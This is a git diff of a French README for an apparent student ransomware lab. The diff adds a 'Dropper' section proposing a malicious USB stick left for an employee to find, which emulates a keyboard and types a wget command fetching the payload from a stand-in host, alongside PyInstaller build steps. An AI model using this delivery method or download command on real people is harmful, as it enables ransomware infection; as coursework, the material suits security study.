@@ -1,4 +1,4 @@
-# TP Ransomware
+# Antoine Goulin - TP Ransomware
 
 ## Introduction
 
@@ -61,6 +61,12 @@ Malgré leur plus grande sensibilité, il est également possible d'utiliser les
 **B4** : avec PyInstaller, il faut utiliser la commande `pyinstaller source/ransomware.py --onefile` depuis notre ordinateur ou `pyinsatller root/ransomware/ransomware.py --onefile` depuis le container (ce que je devais faire pour des raisons de compatibilité, _I use Arch, btw..._)
 
 **B5** : le binaire créé se trouve dans dist/, monté dans root/bin dans le container
+
+### Dropper
+
+Je n'ai pas pris le temps de travailler sur un dropper depuis le CNC mais je souhaite mentionner un usage différent. Il peut être intéressant de songer à l'utilisation d'un _Rubber Ducky_ pour déposer le ransomware sur l'ordinateur d'une victime au sein d'une entreprise. Bien que dans notre cas, cette solution puisse surtout servir à la première entrée dans le système d'une grande structure, nous servant ensuite de levier pour nous infiltrer numériquement, la simplicité d'une clé USB malveillante que l'un des employés trouverait sur le pare-brise de sa voiture ou à un autre endroit inattendu serait dévastatrice.
+
+Pour tester ce genre de méthode, il est possible de se servir de la clé Digispark (ATtiny85 embarqué sur une clé USB), capable de se faire passer pour un clavier et de saisir les touches suffisantes pour ouvrir un terminal et y inscrire `wget https://bonpetitmalware.com/ransomwarepaspiquedeshannetons` en moins de trente secondes.
 
 ### Messages de pression
 
